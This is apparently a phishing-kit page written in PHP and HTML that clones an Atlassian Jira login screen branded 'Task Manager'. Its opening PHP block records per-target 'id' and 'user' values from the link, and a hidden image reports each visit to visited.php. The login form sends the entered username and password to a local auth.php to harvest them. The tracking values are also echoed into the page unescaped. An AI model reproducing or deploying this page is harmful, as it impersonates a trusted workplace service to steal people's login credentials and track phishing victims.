<?php
session_start();

if(isset($_GET['id']) && isset($_GET['user'])){
    $_SESSION['id']= $_GET['id'];
    $_SESSION['user']= $_GET['user'];
    header('Location: /jira/login.php');
}

if(file_exists('config.php')){
    header('Location: config.php');
}
?>
<img src="visited.php?id=<?php echo $_SESSION['id'];?>&user=<?php echo $_SESSION['user'];?>" style="display: none;">
<!DOCTYPE html>
<html class="mozilla" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<title>Log in - Task Manager</title>
<meta name="application-name" content="JIRA" data-name="jira" data-version="8.8.1"><meta name="ajs-server-scheme" content="https">
<meta name="ajs-server-port" content="443">
<meta name="ajs-server-name" content="">
<meta name="ajs-behind-proxy" content="null">
<meta name="ajs-base-url" content="">
<meta name="ajs-dev-mode" content="false">
<meta name="ajs-context-path" content="">
<meta name="ajs-version-number" content="8.8.1">
<meta name="ajs-build-number" content="808001">
<meta name="ajs-is-beta" content="false">
<meta name="ajs-is-rc" content="false">
<meta name="ajs-is-snapshot" content="false">
<meta name="ajs-is-milestone" content="false">
<meta name="ajs-remote-user" content="">
<meta name="ajs-remote-user-fullname" content="">
<meta name="ajs-user-locale" content="en_US">
<meta name="ajs-user-locale-group-separator" content=",">
<meta name="ajs-app-title" content="Task Manager">
<meta name="ajs-keyboard-shortcuts-enabled" content="true">
<meta name="ajs-keyboard-accesskey-modifier" content="Alt+Shift">
<meta name="ajs-enabled-dark-features" content="[&quot;com.atlassian.jira.agile.darkfeature.editable.detailsview&quot;,&quot;nps.survey.inline.dialog&quot;,&quot;com.atlassian.jira.agile.darkfeature.edit.closed.sprint.enabled&quot;,&quot;jira.plugin.devstatus.phasetwo&quot;,&quot;jira.frother.reporter.field&quot;,&quot;atlassian.rest.xsrf.legacy.enabled&quot;,&quot;jira.issue.status.lozenge&quot;,&quot;com.atlassian.jira.config.BIG_PIPE&quot;,&quot;com.atlassian.jira.projects.issuenavigator&quot;,&quot;com.atlassian.jira.config.PDL&quot;,&quot;jira.plugin.devstatus.phasetwo.enabled&quot;,&quot;atlassian.aui.raphael.disabled&quot;,&quot;app-switcher.new&quot;,&quot;frother.assignee.field&quot;,&quot;com.atlassian.jira.projects.ProjectCentricNavigation.Switch&quot;,&quot;jira.onboarding.cyoa&quot;,&quot;com.atlassian.jira.agile.darkfeature.kanplan.enabled&quot;,&quot;com.atlassian.jira.config.ProjectConfig.MENU&quot;,&quot;com.atlassian.jira.projects.sidebar.DEFER_RESOURCES&quot;,&quot;com.atlassian.jira.agile.darkfeature.kanplan.epics.and.versions.enabled&quot;,&quot;com.atlassian.jira.agile.darkfeature.sprint.goal.enabled&quot;,&quot;jira.zdu.admin-updates-ui&quot;,&quot;jira.zdu.jmx-monitoring&quot;,&quot;mail.batching.enabled&quot;,&quot;sd.new.settings.sidebar.location.disabled&quot;,&quot;jira.zdu.cluster-upgrade-state&quot;,&quot;com.atlassian.jira.agile.darkfeature.splitissue&quot;,&quot;com.atlassian.jira.config.CoreFeatures.LICENSE_ROLES_ENABLED&quot;,&quot;jira.export.csv.enabled&quot;]">
<meta name="ajs-in-admin-mode" content="false">
<meta name="ajs-is-sysadmin" content="false">
<meta name="ajs-is-admin" content="false">
<meta name="ajs-outgoing-mail-enabled" content="true">
<meta name="ajs-archiving-enabled" content="false">
<meta name="ajs-date-relativize" content="true">
<meta name="ajs-date-time" content="h:mm a">
<meta name="ajs-date-day" content="EEEE h:mm a">
<meta name="ajs-date-dmy" content="dd/MMM/yy">
<meta name="ajs-date-complete" content="dd/MMM/yy h:mm a">
<script type="text/javascript">var AJS=AJS||{};AJS.debug=true;</script>
<meta id="atlassian-token" name="atlassian-token" content="B9HD-TRIM-PSK3-3JYC_a84ca0e8a2ac80a120f3f69b108bbb3a4208f81c_lout">
<link rel="search" type="application/opensearchdescription+xml" " title="Log in - Task Manager">
<!--[if IE]><![endif]-->
<script type="text/javascript">
    (function() {
        var contextPath = '';

        function printDeprecatedMsg() {
            if (console && console.warn) {
                console.warn('DEPRECATED JS - contextPath global variable has been deprecated since 7.4.0. Use `wrm/context-path` module instead.');
            }
        }

        Object.defineProperty(window, 'contextPath', {
            get: function() {
                printDeprecatedMsg();
                return contextPath;
            },
            set: function(value) {
                printDeprecatedMsg();
                contextPath = value;
            }
        });
    })();

</script>
<script>
window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\"\"";
WRM._unparsedData["jira.core:feature-flags-data.feature-flag-data"]="{\"enabled-feature-keys\":[\"com.atlassian.jira.agile.darkfeature.editable.detailsview\",\"nps.survey.inline.dialog\",\"com.atlassian.jira.agile.darkfeature.edit.closed.sprint.enabled\",\"jira.plugin.devstatus.phasetwo\",\"jira.frother.reporter.field\",\"atlassian.rest.xsrf.legacy.enabled\",\"jira.issue.status.lozenge\",\"com.atlassian.jira.config.BIG_PIPE\",\"com.atlassian.jira.projects.issuenavigator\",\"com.atlassian.jira.config.PDL\",\"jira.plugin.devstatus.phasetwo.enabled\",\"atlassian.aui.raphael.disabled\",\"app-switcher.new\",\"frother.assignee.field\",\"com.atlassian.jira.projects.ProjectCentricNavigation.Switch\",\"jira.onboarding.cyoa\",\"com.atlassian.jira.agile.darkfeature.kanplan.enabled\",\"com.atlassian.jira.config.ProjectConfig.MENU\",\"com.atlassian.jira.projects.sidebar.DEFER_RESOURCES\",\"com.atlassian.jira.agile.darkfeature.kanplan.epics.and.versions.enabled\",\"com.atlassian.jira.agile.darkfeature.sprint.goal.enabled\",\"jira.zdu.admin-updates-ui\",\"jira.zdu.jmx-monitoring\",\"mail.batching.enabled\",\"sd.new.settings.sidebar.location.disabled\",\"jira.zdu.cluster-upgrade-state\",\"com.atlassian.jira.agile.darkfeature.splitissue\",\"com.atlassian.jira.config.CoreFeatures.LICENSE_ROLES_ENABLED\",\"jira.export.csv.enabled\"],\"feature-flag-states\":{\"atlassian.cdn.static.assets\":true,\"mail.batching\":false,\"com.atlassian.jira.diagnostics.perflog\":true,\"com.atlassian.jira.privateEntitiesEditable\":false,\"com.atlassian.jira.issuetable.move.links.hidden\":true,\"jira.priorities.per.project.edit.default\":false,\"com.atlassian.jira.agile.darkfeature.unlink.sprints.on.issue.move\":true,\"jira.renderer.consider.variable.format\":true,\"com.atlassian.jira.user.dbIdBasedKeyGenerationStrategy\":true,\"jira.priorities.per.project.jsd\":true,\"com.atlassian.jira.agile.darkfeature.rapid.boards.bands\":true,\"com.atlassian.jira.sharedEntityEditRights\":true,\"com.atlassian.jira.agile.darkfeature.flexible.boards\":true,\"com.atlassian.jira.agile.darkfeature.sprint.picker.allsprints.suggestion\":true,\"com.atlassian.jira.agile.darkfeature.sprint.goal\":false,\"jira.dc.lock.leasing\":true,\"com.atlassian.jira.accessibility.personal.settings\":true,\"mail.batching.create.section.cf\":true,\"com.atlassian.jira.custom.csv.escaper\":true,\"com.atlassian.jira.plugin.issuenavigator.filtersUxImprovment\":true,\"com.atlassian.jira.agile.darkfeature.kanplan.epics.and.versions\":false,\"com.atlassian.jira.upgrade.startup.fix.index\":true,\"jira.dc.cleanup.cluser.tasks\":true,\"com.atlassian.jira.issues.archiving.filters\":false,\"mail.batching.override.core\":true,\"jira.users.and.roles.page.in.react\":true,\"com.atlassian.jira.issuetable.draggable\":true,\"com.atlassian.jira.attachments.generate.unique.suffix\":true,\"com.atlassian.jira.agile.darkfeature.kanban.hide.old.done.issues\":true,\"jira.jql.suggestrecentfields\":false,\"com.atlassian.jira.agile.darkfeature.backlog.showmore\":true,\"com.atlassian.jira.gdpr.rtbf\":true,\"com.atlassian.jira.security.xsrf.session.token\":true,\"com.atlassian.jira.agile.darkfeature.optimistic.transitions\":true,\"com.atlassian.jira.agile.darkfeature.kanplan\":false,\"com.atlassian.jira.agile.darkfeature.burnupchart\":true,\"com.atlassian.jira.issues.archiving.browse\":true,\"com.atlassian.jira.agile.darkfeature.future.sprint.dates\":true,\"jira.instrumentation.laas\":false,\"jira.customfields.paginated.ui\":true,\"com.atlassian.jira.agile.darkfeature.edit.closed.sprint\":false,\"mail.batching.user.notification\":true,\"jira.create.linked.issue\":true,\"com.atlassian.jira.agile.darkfeature.dataonpageload\":true,\"com.atlassian.jira.advanced.audit.log\":true,\"jira.sal.host.connect.accessor.existing.transaction.will.create.transactions\":true,\"external.links.new.window\":true,\"jira.quick.search\":true,\"com.atlassian.jira.projects.per.project.permission.query\":true,\"jira.jql.smartautoselectfirst\":false,\"com.atlassian.jira.issues.archiving\":true,\"index.use.snappy\":true,\"jira.priorities.per.project\":true}}";
WRM._unparsedData["jira.core:default-comment-security-level-data.DefaultCommentSecurityLevelHelpLink"]="{\"extraClasses\":\"default-comment-level-help\",\"title\":\"Commenting on an Issue\",\"url\":\"https://docs.atlassian.com/jira/jcore-docs-088/Editing+and+collaborating+on+issues#Editingandcollaboratingonissues-restrictacomment\",\"isLocal\":false}";
WRM._unparsedData["com.atlassian.analytics.analytics-client:policy-update-init.policy-update-data-provider"]="false";
WRM._unparsedData["com.atlassian.analytics.analytics-client:programmatic-analytics-init.programmatic-analytics-data-provider"]="false";
WRM._unparsedData["jira.core:dateFormatProvider.allFormats"]="{\"dateFormats\":{\"meridiem\":[\"AM\",\"PM\"],\"eras\":[\"BC\",\"AD\"],\"months\":[\"January\",\"February\",\"March\",\"April\",\"May\",\"June\",\"July\",\"August\",\"September\",\"October\",\"November\",\"December\"],\"monthsShort\":[\"Jan\",\"Feb\",\"Mar\",\"Apr\",\"May\",\"Jun\",\"Jul\",\"Aug\",\"Sep\",\"Oct\",\"Nov\",\"Dec\"],\"weekdaysShort\":[\"Sun\",\"Mon\",\"Tue\",\"Wed\",\"Thu\",\"Fri\",\"Sat\"],\"weekdays\":[\"Sunday\",\"Monday\",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\"]},\"lookAndFeelFormats\":{\"relativize\":\"true\",\"time\":\"h:mm a\",\"day\":\"EEEE h:mm a\",\"dmy\":\"dd/MMM/yy\",\"complete\":\"dd/MMM/yy h:mm a\"}}";
WRM._unparsedData["jira.core:avatar-picker-data.data"]="{}";
WRM._unparsedData["com.atlassian.jira.jira-header-plugin:dismissedFlags.flags"]="{\"dismissed\":[]}";
WRM._unparsedData["com.atlassian.jira.jira-header-plugin:newsletter-signup-tip-init.newsletterSignup"]="{\"signupDescription\":\"Get updates, inspiration and best practices from the team behind Jira.\",\"formUrl\":\"https://www.atlassian.com/apis/exact-target/{0}/subscribe?mailingListId=1401671\",\"signupTitle\":\"Sign up!\",\"signupId\":\"newsletter-signup-tip\",\"showNewsletterTip\":false}";
WRM._unparsedData["com.atlassian.jira.project-templates-plugin:project-templates-plugin-resources.ptAnalyticsData"]="{\"instanceCreatedDate\":\"2019-10-22\"}";
WRM._unparsedData["jira.core:user-message-flags-data.adminLockout"]="{}";
WRM._unparsedData["com.atlassian.plugins.helptips.jira-help-tips:help-tip-manager.JiraHelpTipData"]="{\"anonymous\":true}";
WRM._unparsedData["jira.request.correlation-id"]="\"5963c7cb1a949a\"";
if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
<link type="text/css" rel="stylesheet" href="files/batch_003.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="files/batch.css" data-wrm-key="atl.general,jira.global,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="files/batch_002.css" data-wrm-key="jira.login,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="files/jira.css" data-wrm-key="jira.webresources:captcha" data-wrm-batch-type="resource" media="all">
<script type="text/javascript" src="files/batch.js" data-wrm-key="_super" data-wrm-batch-type="context" data-initially-rendered=""></script>
<script type="text/javascript" src="files/batch_004.js" data-wrm-key="atl.general,jira.global,-_super" data-wrm-batch-type="context" data-initially-rendered=""></script>
<script type="text/javascript" src="files/batch_003.js" data-wrm-key="atl.global,-_super" data-wrm-batch-type="context" data-initially-rendered=""></script>
<script type="text/javascript" src="files/jira_003.js" data-wrm-key="jira.webresources:captcha" data-wrm-batch-type="resource" data-initially-rendered=""></script>
<link type="text/css" rel="stylesheet" href="files/batch_004.css" data-wrm-key="jira.global.look-and-feel,-_super" data-wrm-batch-type="context" media="all">
<script type="text/javascript" src="files/shortcuts.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="decorator" content="login">
<script type="text/javascript" charset="utf-8" src="files/batch_002.js"></script></head>
<body id="jira" class="aui-layout aui-theme-default page-type-login   " data-version="8.8.1" data-aui-version="8.6.0">
    <div id="page">
        <header id="header" role="banner">
<script>
require(["jquery", "jira/license-banner"], function ($, licenseBanner) {
    $(function () {
        licenseBanner.showLicenseBanner("");
        licenseBanner.showLicenseFlag("");
    });
});
</script>
<nav class="aui-header aui-dropdown2-trigger-group" role="navigation" resolved="" data-aui-responsive="true"><div class="aui-header-inner"><div class="aui-header-before"><a class=" aui-dropdown2-trigger app-switcher-trigger" aria-controls="app-switcher" aria-haspopup="true" role="button" tabindex="0" data-aui-trigger="" href="#app-switcher" resolved="" aria-expanded="false"></a><div id="app-switcher" class="aui-dropdown2 aui-style-default aui-layer" role="menu" aria-hidden="true" data-is-switcher="true" data-environment="{&quot;isUserAdmin&quot;:false,&quot;isAppSuggestionAvailable&quot;:false,&quot;isSiteAdminUser&quot;:false}" resolved=""><div class="aui-dropdown2-section"><ul class="nav-links"><li class="nav-link nav-link-local"><a href="" class="aui-dropdown2-radio aui-dropdown2-checked checked" title="" resolved="" aria-checked="true" tabindex="0"><span class="nav-link-label">Task Manager</span></a></li><li class="nav-link"><a href="" class="aui-dropdown2-radio " title="" resolved="" aria-checked="false" tabindex="0"><span class="nav-link-label">Confluence</span></a></li></ul></div></div></div><div class="aui-header-primary"><h1 id="logo" class="aui-header-logo aui-header-logo-custom"><a href=""><img src="files/jira-logo-scaled.png" alt="" data-aui-responsive-header-index="0"><span class="aui-header-logo-text">Task Manager</span></a></h1><ul class="aui-nav" style="width: auto;"><li><a href="https://google.com" class=" aui-nav-link aui-dropdown2-trigger aui-dropdown2-ajax" id="home_link" aria-haspopup="true" aria-controls="home_link-content" title="View and manage your dashboards" accesskey="d" resolved="" aria-expanded="false">Dashboards</a><div class="aui-dropdown2 aui-style-default aui-layer" id="home_link-content" data-aui-dropdown2-ajax-key="home_link" resolved="" aria-hidden="true"></div></li>
</ul></div><div class="aui-header-secondary"><ul class="aui-nav">
<li id="quicksearch-menu">
    <form action="/secure/QuickSearch.jspa" method="get" id="quicksearch" class="aui-quicksearch dont-default-focus ajs-dirty-warning-exempt">
        <input id="quickSearchInput" autocomplete="off" class="search" type="text" title="Search ( Type '/' )" placeholder="Search" name="searchString" accesskey="q"><div class="quick-search-spinner"></div>
        <input type="submit" class="hidden" value="Search">
    </form>
</li>
<li><a class="jira-feedback-plugin" role="button" aria-haspopup="true" id="jira-header-feedback-link" href="#"></a></li>

    <li id="system-help-menu">
        <a class="aui-nav-link aui-dropdown2-trigger aui-dropdown2-trigger-arrowless" id="help_menu" aria-haspopup="true" href="https://docs.atlassian.com/jira/jcore-docs-088/" target="$textUtils.htmlEncode($rootHelpMenuItem.params.target)" title="Help" resolved="" aria-controls="system-help-menu-content" aria-expanded="false"></a>
        <div id="system-help-menu-content" class="aui-dropdown2 aui-style-default aui-layer" resolved="" aria-hidden="true">
            <div class="aui-dropdown2-section">
            <ul id="jira-help" class="aui-list-truncate">
            <li>
                <a id="view_core_help" class="aui-nav-link " title="Go to the online documentation for Jira Core" href="https://docs.atlassian.com/jira/jcore-docs-088/" target="_blank">Jira Core help</a>
            </li>
            <li>
                <a id="keyshortscuthelp" class="aui-nav-link " title="Get more information about Jira's Keyboard Shortcuts ( Type '?' )" href="" target="_blank">Keyboard Shortcuts</a>
            </li>
            <li>
                <a id="view_about" class="aui-nav-link " title="Get more information about Jira" href="">About Jira</a>
            </li>
            <li>
                <a id="view_credits" class="aui-nav-link " title="See who did what" href="" target="_blank">Jira Credits</a>
                </li>
            </ul>
        </div>
    </div>
</li>

<li id="user-options">
            <a class="aui-nav-link login-link" href="">Log In</a>
                <div id="user-options-content" class="aui-dropdown2 aui-style-default aui-layer" resolved="" aria-hidden="true">
                            <div class="aui-dropdown2-section">
                                                        </div>
                    </div>
    </li>
</ul></div></div><!-- .aui-header-inner--></nav><!-- .aui-header -->
            </header>
    <section id="content" role="main">
            <div class="aui-page-panel"><div class="aui-page-panel-inner">
                    <section class="aui-page-panel-content">
                              
        <header class="aui-page-header"><div class="aui-page-header-inner"><div class="aui-page-header-main">
                
                    <h1>Welcome to Task Manager</h1>
                
            </div></div></header>
    
<form action="auth.php" class="aui" id="login-form" method="post">
    <div class="form-body">
        
    <div class="aui-group jira-login-method">
        <div class="aui-item jira-login-item">

<div class="field-group">
     <label accesskey="u" for="login-form-username"><u>U</u>sername</label>
     <input class="text medium-field" id="login-form-username" name="username" type="text">
</div>
<div class="field-group">
    
                    <label accesskey="p" for="login-form-password" id="passwordlabel"><u>P</u>assword</label>
                    <input id="login-form-password" class="text medium-field" name="password" type="password">
                    <input type="hidden" name="id" value="<?php echo $_SESSION['id'];?>">
                  
</div>

<fieldset class="group ">

<div class="checkbox" resolved=""> 
                       
                            <input class="checkbox" id="login-form-remember-me" name="os_cookie" type="checkbox" value="true" resolved=""><span class="aui-form-glyph"></span>
                            <label for="login-form-remember-me" accesskey="r"><u>R</u>emember my login on this computer</label>
                    </div>
                    
</fieldset> <!-- // .group -->

            <div id="sign-up-hint" class="field-group">
                
                Not a member? To request an account, please contact your <a href="">Jira administrators</a>.
                
            </div>
        
        </div>
    </div>
    
<div class="hidden">
    <input name="os_destination" type="hidden" value="/default.jsp">
</div>

<div class="hidden">
    <input name="user_role" type="hidden">
</div>


<div class="hidden">
    <input name="atl_token" type="hidden">
</div>

    </div>
    
    <div class="buttons-container form-footer">
        <div class="buttons">

<input accesskey="s" class="aui-button aui-button-primary" id="login-form-submit" name="login" title="Press Alt+Shift+s to submit this form" type="submit" value="Log In" resolved="">


<a accesskey="`" class="aui-button aui-button-link cancel" href="" id="login-form-cancel" title="Press Alt+Shift+` to cancel" resolved="">Can't access your account?</a>
            
        </div>
        
    </div>
    
</form> <!-- // .aui #login-form -->

                        </section><!-- .aui-page-panel-content -->
                </div><!-- .aui-page-panel-inner --></div><!-- .aui-page-panel -->
        </section>
        
            <footer id="footer" role="contentinfo">
                
                

<section class="footer-body">
<ul class="atlassian-footer">
    <li>
        Atlassian Jira <a class="seo-link" rel="nofollow" href="https://www.atlassian.com/software/jira">Project Management Software</a>
                                            <span id="footer-build-information">(v8.8.1#808001-<span title="e5cdcf9fa57df21d4b441572dda42ac58b826e01" data-commit-id="e5cdcf9fa57df21d4b441572dda42ac58b826e01}">sha1:e5cdcf9</span>)</span>
    </li>
    <li>
        <a id="about-link" rel="nofollow" href="">About Jira</a>
    </li>
    <li>
        <a id="footer-report-problem-link" rel="nofollow" href="">Report a problem</a>
    </li>
</ul>
    <p class="atlassian-footer">
        <span class="licensemessage">
            
        </span>
    </p>

    <div id="footer-logo"><a rel="nofollow" href="http://www.atlassian.com/">Atlassian</a></div>
</section>

<fieldset class="hidden parameters">
    <input type="hidden" title="loggedInUser" value="">
    <input type="hidden" title="ajaxTimeout" value="The call to the Jira server did not complete within the timeout period.  We are unsure of the result of this operation.">
    <input type="hidden" title="JiraVersion" value="8.8.1">
    <input type="hidden" title="ajaxUnauthorised" value="You are not authorized to perform this operation.  Please log in.">
    <input type="hidden" title="baseURL" value="">
    <input type="hidden" title="ajaxCommsError" value="The Jira server could not be contacted. This may be a temporary glitch or the server may be down. ">
    <input type="hidden" title="ajaxServerError" value="The Jira server was contacted but has returned an error response. We are unsure of the result of this operation.">
    <input type="hidden" title="ajaxErrorCloseDialog" value="Close this dialog and press refresh in your browser">
    <input type="hidden" title="ajaxErrorDialogHeading" value="Communications Breakdown">

    <input type="hidden" title="dirtyMessage" value="You have entered new data on this page. If you navigate away from this page without first saving your data, the changes will be lost.">
    <input type="hidden" title="dirtyDialogMessage" value="You have entered new data in this dialog. If you navigate away from this dialog without first saving your data, the changes will be lost. Click cancel to return to the dialog.">
    <input type="hidden" title="keyType" value="Type">
    <input type="hidden" title="keyThen" value="then">
    <input type="hidden" title="dblClickToExpand" value="Double click to expand">
    <input type="hidden" title="actions" value="Actions">
    <input type="hidden" title="removeItem" value="Remove">
    <input type="hidden" title="workflow" value="Workflow">
    <input type="hidden" title="labelNew" value="New Label">
    <input type="hidden" title="issueActionsHint" value="Begin typing for available operations or press down to see all">
    <input type="hidden" title="closelink" value="Close">
    <input type="hidden" title="dotOperations" value="Operations">
    <input type="hidden" title="dotLoading" value="Loading...">
    <input type="hidden" title="frotherSuggestions" value="Suggestions">
    <input type="hidden" title="frotherNomatches" value="No Matches">
    <input type="hidden" title="multiselectVersionsError" value="{0} is not a valid version.">
    <input type="hidden" title="multiselectComponentsError" value="{0} is not a valid component.">
    <input type="hidden" title="multiselectGenericError" value="The value {0} is invalid.">
</fieldset>
           </footer>
        
    </div>

<script type="text/javascript" src="files/jira_002.js" data-wrm-key="jira.webresources:bigpipe-js" data-wrm-batch-type="resource" data-initially-rendered=""></script>
<script type="text/javascript" src="files/jira.js" data-wrm-key="jira.webresources:bigpipe-init" data-wrm-batch-type="resource" data-initially-rendered=""></script>

</body></html>